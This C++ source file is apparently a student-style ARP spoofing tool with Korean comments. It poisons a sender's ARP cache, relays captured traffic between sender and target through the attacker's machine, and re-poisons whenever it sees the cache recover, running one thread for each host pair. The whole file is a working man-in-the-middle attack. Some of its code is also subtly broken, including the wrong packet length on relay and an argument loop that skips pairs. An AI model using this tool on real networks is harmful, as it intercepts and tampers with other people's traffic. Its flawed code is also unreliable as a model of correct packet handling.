#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <iostream>
#include <cstdlib>
#include <string>
#include <libnet.h>
#include <thread>
#include <vector>
#include <future>

#include "AttackerInfo.h"
#include "SenderUtil.h"
#include "TargetUtil.h"


#define MAC_ADDR_LEN 6



//Attacker MAC function

void usage() {
        printf("syntax: send-arp-test <interface>\n");
        printf("sample: send-arp-test wlan0\n");
}

int start_spoofing(char*dev ,char* sip , char* tip){

        Mac macAddress = getMacAddress(dev);
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
                fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
                return -1;
        }

        Ip AttackerIp = getAttackerIp(dev);
        Mac SenderMac = getSenderMac(handle, macAddress, AttackerIp ,Ip(sip));
        Mac TargetMac = getTargetMac(handle, macAddress, AttackerIp ,Ip(tip));
        
        //Sender감염 패킷생성
        EthArpPacket packet = Sender_Infection(dev,macAddress,SenderMac,Ip(sip),Ip(tip));
        //패킷 전송
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        //패킷 캡쳐
        while(1){

		const u_char* received_pkt;
		struct pcap_pkthdr* header;
		struct libnet_ethernet_hdr* Packet_eth;
		struct libnet_ipv4_hdr* Packet_ip;

                res = pcap_next_ex(handle, &header, &received_pkt);
                if (res == 0) continue;
                if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                        printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                        break;
                }

                Packet_eth = (struct libnet_ethernet_hdr *)(received_pkt);
                Packet_ip = (struct libnet_ipv4_hdr *)(received_pkt + sizeof(struct libnet_ethernet_hdr));

		//Sender -> Attacker -> Target
                if(ntohs(Packet_eth-> ether_type)==(EthHdr::Ip4) && Mac(Packet_eth->ether_shost)==SenderMac){
			u_int8_t* tmpMac =static_cast<uint8_t*>(macAddress);
			u_int8_t* tmpTmac = static_cast<uint8_t*>(TargetMac);
			memcpy(Packet_eth->ether_shost, tmpMac, MAC_ADDR_LEN);
			memcpy(Packet_eth -> ether_dhost, tmpTmac,MAC_ADDR_LEN);	

                        res = pcap_sendpacket(handle, received_pkt, sizeof(pcap_pkthdr));
                        if (res != 0) {
                                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                        }
                        else{
                                printf("\n<<Sender -> Attacker -> Target>>\n");
                        }    
                }
                //Target -> Attaceker -> Sender
                else if(ntohs(Packet_eth -> ether_type) == (EthHdr::Ip4) && Mac(Packet_eth->ether_shost)==TargetMac){
			u_int8_t* tmpMac = static_cast<uint8_t*>(macAddress);
			u_int8_t* tmpSenderMac = static_cast<uint8_t*>(SenderMac);

			memcpy(Packet_eth -> ether_shost,tmpMac,MAC_ADDR_LEN);
			memcpy(Packet_eth -> ether_dhost,tmpSenderMac,MAC_ADDR_LEN);

			Packet_ip->ip_src.s_addr = htonl(static_cast<uint32_t>(AttackerIp));
                        Packet_ip->ip_dst.s_addr = htonl(static_cast<uint32_t>(Ip(tip)));

                        res = pcap_sendpacket(handle, received_pkt, sizeof(pcap_pkthdr));
                        if (res != 0) {
                                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                        }else{
                                printf("\nTarget-> Attacker -> Sender\n");
                        }
                        
                }

                //When ARP Table Recover
                else if(Mac(Packet_eth -> ether_dhost)==Mac::broadcastMac()){
                        if(Mac(Packet_eth -> ether_shost)==TargetMac || Mac(Packet_eth -> ether_shost) == SenderMac){
                                //Sender감염 패킷생성
                                EthArpPacket packet = Sender_Infection(dev,macAddress,SenderMac,Ip(sip),Ip(tip));
                                //패킷 전송
                                int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
                                if (res != 0) {
                                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                                }else
				{
                                        printf("\n+Detecting Arp Recover and re-Infection+\n");
                                }
                        }
                }
                else{
                        EthArpPacket packet = Sender_Infection(dev,macAddress,SenderMac,Ip(sip),Ip(tip));
                        sleep(1);
                        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
                        if (res != 0) {
                                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                        }
                        else
			{
                                printf("\n*packet transmission*\n");
                        }
                }
        }
 	pcap_close(handle);
	return 0;

}

int main(int argc, char* argv[]) {
        if (argc <=3) { //입력값이 3개 이하면 에러
                usage();
                return -1;
        }  

        char* dev = argv[1]; //네트워크 인터페이스 명

        std::vector<std::future<int>> spoof_threads;

        for (int i = 2; i < argc-1; i+=2) {
                std::future<int> spoof_thread = std::async(std::launch::async, start_spoofing, dev, argv[i], argv[i + 1]);
                spoof_threads.push_back(std::move(spoof_thread));
                i += 1; // 각각의 주소를 처리하기 위해 두 개씩 건너뜀
        }

        // 모든 스레드가 끝날 때까지 기다림
        for (auto& thread : spoof_threads) {
                thread.get();
        }
        
        return 0;
}
       

